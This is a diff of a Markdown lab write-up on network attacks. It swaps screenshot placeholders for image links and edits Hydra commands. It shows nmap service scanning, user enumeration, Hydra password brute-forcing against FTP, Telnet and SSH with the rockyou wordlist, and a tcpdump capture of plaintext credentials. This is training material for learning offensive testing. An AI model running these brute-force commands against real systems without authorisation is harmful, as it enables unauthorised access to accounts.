@@ -43,21 +43,21 @@ nmap -sV -p21,23,22,80 <target-ip>
 - user
 - test
 - ftpuser
-
-📸 Screenshot: _[Insert enum4linux output or screenshot here]_
+![edit text](vimusers.jpg)
 
 ---
 
 ### 🔓 2. Perform Brute Force Attacks
 
 #### 2.1 FTP, TELNET, SSH  
-**Tools used**: `Hydra`, `Medusa`, `NetExec`
+**Tools used**: `Hydra`
 
 **FTP**
 
 ```bash
-hydra -l admin -P rockyou.txt ftp://<target-ip>
+hydra -L users.txt -P /usr/share/wordlists/simplepass.txt -t 4 ftp:ftp://<target-ip> -o resultftp.txt
 ```
+![ftp result and command](ftpcommandandresults.jpg)
 
 **TELNET**
 
@@ -65,14 +65,15 @@ hydra -l admin -P rockyou.txt ftp://<target-ip>
 hydra -L users.txt -P passwords.txt telnet://<target-ip>
 ```
 
+
 **SSH**
 
 ```bash
 hydra -l root -P rockyou.txt ssh://<target-ip>
 ```
 
-📸 Screenshot(s): _Successful login screenshots for each protocol._
-
+![ssh command](sshcommand.jpg)
+![ssh result](sshresults.jpg)
 ---
 
 #### 2.2 HTTP (Web Login Brute Force)  
@@ -104,6 +105,7 @@ tcpdump -i eth0 -w capture.pcap
 | TELNET   | Plaintext data ✔️                  |
 | SSH      | Encrypted traffic ✅                |
 | HTTP     | Login credentials in POST ✔️       |
+
 
 📸 Screenshot: _Wireshark showing FTP/Telnet plaintext credentials and comparison with SSH._
 
